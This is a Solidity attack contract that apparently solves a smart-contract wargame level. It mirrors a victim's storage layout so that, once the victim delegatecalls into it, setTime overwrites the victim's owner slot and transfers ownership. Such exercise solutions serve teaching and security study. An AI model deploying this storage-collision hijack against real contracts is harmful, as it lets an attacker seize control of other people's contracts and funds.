// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

    function check(uint _time) public returns (address) {
        return address(uint160(_time));
    }
}
